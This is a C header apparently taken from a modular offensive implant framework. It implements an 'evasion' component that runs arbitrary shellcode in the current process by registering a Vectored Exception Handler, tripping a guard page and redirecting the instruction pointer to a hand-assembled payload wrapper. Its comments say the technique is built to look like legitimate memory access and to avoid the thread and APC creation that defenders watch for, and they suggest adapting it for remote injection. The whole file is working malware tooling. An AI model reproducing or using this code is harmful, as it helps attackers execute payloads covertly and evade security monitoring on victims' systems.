// chunk: evasion/veh_inject
// depends: (none)
// provides: veh_inject_init
// headers: windows.h
// risk: low
// note: Vectored Exception Handler (VEH) payload execution — registers a VEH,
//       then triggers a controlled exception (guard page violation). The VEH handler
//       redirects execution to the payload. No thread creation, no APC, no remote
//       process manipulation — everything runs in the current process context.
//       The exception trigger looks like normal memory access, and the handler
//       runs from the OS exception dispatch chain, appearing legitimate.
//       Can also be used for remote injection by writing a VEH registration stub
//       into a target process and triggering it via APC.

#ifndef CHUNK_VEH_INJECT
#define CHUNK_VEH_INJECT

#include <windows.h>

/* State for VEH-based execution */
typedef struct _VEH_EXEC_CTX {
    PVOID  payload_exec;     /* RX memory containing the payload */
    DWORD  payload_size;
    PVOID  guard_page;       /* Guard page that triggers the exception */
    PVOID  veh_handle;       /* Handle from AddVectoredExceptionHandler */
    volatile LONG executed;  /* Flag: payload has been executed */
} VEH_EXEC_CTX;

static VEH_EXEC_CTX _veh_ctx = {0};

/*
 * VEH handler: catches the guard page exception and redirects RIP to payload.
 *
 * When a STATUS_GUARD_PAGE_VIOLATION occurs on our guard page:
 * 1. Set the instruction pointer to the payload
 * 2. Mark as executed
 * 3. Continue execution (at the payload)
 *
 * The payload should be written to return cleanly (ret or jmp to a
 * saved continuation address).
 */
static LONG CALLBACK _veh_payload_handler(EXCEPTION_POINTERS *ep) {
    /* Only handle guard page violations */
    if (ep->ExceptionRecord->ExceptionCode != STATUS_GUARD_PAGE_VIOLATION)
        return EXCEPTION_CONTINUE_SEARCH;

    /* Verify the fault is on our guard page */
    PVOID fault_addr = (PVOID)ep->ExceptionRecord->ExceptionInformation[1];
    BYTE *gp = (BYTE *)_veh_ctx.guard_page;
    if (fault_addr < gp || fault_addr >= gp + 4096)
        return EXCEPTION_CONTINUE_SEARCH;

    /* Only fire once */
    if (InterlockedCompareExchange(&_veh_ctx.executed, 1, 0) != 0)
        return EXCEPTION_CONTINUE_SEARCH;

    if (_veh_ctx.payload_exec) {
        /* Redirect execution to our payload */
#ifdef _WIN64
        ep->ContextRecord->Rip = (DWORD64)_veh_ctx.payload_exec;
#else
        ep->ContextRecord->Eip = (DWORD)_veh_ctx.payload_exec;
#endif
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/*
 * _veh_build_shellcode_wrapper: Build a small wrapper around the payload
 * that saves/restores state and returns cleanly to the caller.
 *
 * The wrapper:
 *   1. Saves volatile registers
 *   2. Calls the actual payload
 *   3. Restores registers
 *   4. Returns (which returns to the code after the guard page read)
 */
static PVOID _veh_build_wrapper(BYTE *payload, DWORD payload_size, DWORD *out_size) {
    /* Wrapper structure:
       push rbx, rsi, rdi, r12-r15   (callee-saved we might clobber)
       sub rsp, 0x28                 (shadow space + alignment)
       <inline payload>
       add rsp, 0x28
       pop r15-r12, rdi, rsi, rbx
       xor eax, eax                  (return 0 to "continue" the read)
       ret
    */
    DWORD wrapper_size = payload_size + 64;
    BYTE *wrapper = (BYTE *)VirtualAlloc(NULL, wrapper_size,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE);
    if (!wrapper) return NULL;

    DWORD off = 0;

    /* Save callee-saved registers */
    wrapper[off++] = 0x53;                                    /* push rbx */
    wrapper[off++] = 0x56;                                    /* push rsi */
    wrapper[off++] = 0x57;                                    /* push rdi */
    wrapper[off++] = 0x41; wrapper[off++] = 0x54;             /* push r12 */
    wrapper[off++] = 0x41; wrapper[off++] = 0x55;             /* push r13 */
    wrapper[off++] = 0x41; wrapper[off++] = 0x56;             /* push r14 */
    wrapper[off++] = 0x41; wrapper[off++] = 0x57;             /* push r15 */
    wrapper[off++] = 0x48; wrapper[off++] = 0x83;
    wrapper[off++] = 0xEC; wrapper[off++] = 0x28;             /* sub rsp, 0x28 */

    /* Inline the payload */
    memcpy(wrapper + off, payload, payload_size);
    off += payload_size;

    /* Restore */
    wrapper[off++] = 0x48; wrapper[off++] = 0x83;
    wrapper[off++] = 0xC4; wrapper[off++] = 0x28;             /* add rsp, 0x28 */
    wrapper[off++] = 0x41; wrapper[off++] = 0x5F;             /* pop r15 */
    wrapper[off++] = 0x41; wrapper[off++] = 0x5E;             /* pop r14 */
    wrapper[off++] = 0x41; wrapper[off++] = 0x5D;             /* pop r13 */
    wrapper[off++] = 0x41; wrapper[off++] = 0x5C;             /* pop r12 */
    wrapper[off++] = 0x5F;                                    /* pop rdi */
    wrapper[off++] = 0x5E;                                    /* pop rsi */
    wrapper[off++] = 0x5B;                                    /* pop rbx */
    wrapper[off++] = 0x31; wrapper[off++] = 0xC0;             /* xor eax, eax */
    wrapper[off++] = 0xC3;                                    /* ret */

    /* Make executable */
    DWORD old_prot;
    VirtualProtect(wrapper, off, PAGE_EXECUTE_READ, &old_prot);

    if (out_size) *out_size = off;
    return wrapper;
}

/*
 * veh_inject_init: Execute payload via VEH + guard page exception.
 *
 * payload:      shellcode / position-independent code
 * payload_size: size in bytes
 *
 * 1. Register a VEH (first handler in chain)
 * 2. Copy payload to RX memory
 * 3. Allocate a guard page
 * 4. Read from the guard page (triggers STATUS_GUARD_PAGE_VIOLATION)
 * 5. VEH handler redirects RIP to payload
 * 6. Payload executes and returns
 * 7. Cleanup
 *
 * Returns 1 on success, 0 on failure.
 */
static int veh_inject_init(BYTE *payload, DWORD payload_size) {
    /* Build wrapped payload */
    DWORD wrapped_size = 0;
    PVOID wrapped = _veh_build_wrapper(payload, payload_size, &wrapped_size);
    if (!wrapped) return 0;

    /* Set up context */
    _veh_ctx.payload_exec = wrapped;
    _veh_ctx.payload_size = wrapped_size;
    _veh_ctx.executed = 0;

    /* Allocate a guard page */
    _veh_ctx.guard_page = VirtualAlloc(NULL, 4096,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_READWRITE | PAGE_GUARD);
    if (!_veh_ctx.guard_page) {
        VirtualFree(wrapped, 0, MEM_RELEASE);
        return 0;
    }

    /* Register VEH (first in chain for priority) */
    _veh_ctx.veh_handle = AddVectoredExceptionHandler(1, _veh_payload_handler);
    if (!_veh_ctx.veh_handle) {
        VirtualFree(_veh_ctx.guard_page, 0, MEM_RELEASE);
        VirtualFree(wrapped, 0, MEM_RELEASE);
        return 0;
    }

    /*
     * Trigger the guard page violation by reading from the page.
     * The VEH handler will intercept this and redirect to our payload.
     * After the payload completes (ret), execution continues here.
     */
    volatile BYTE trigger_val = *(volatile BYTE *)_veh_ctx.guard_page;
    (void)trigger_val;

    /* Wait for execution to complete (should be immediate since VEH is synchronous) */
    int success = (_veh_ctx.executed == 1) ? 1 : 0;

    /* Cleanup */
    RemoveVectoredExceptionHandler(_veh_ctx.veh_handle);
    _veh_ctx.veh_handle = NULL;

    VirtualFree(_veh_ctx.guard_page, 0, MEM_RELEASE);
    _veh_ctx.guard_page = NULL;

    /* Note: we don't free wrapped payload here in case it's still referenced.
       In production, set a flag and free on next init or process exit. */

    return success;
}

#endif
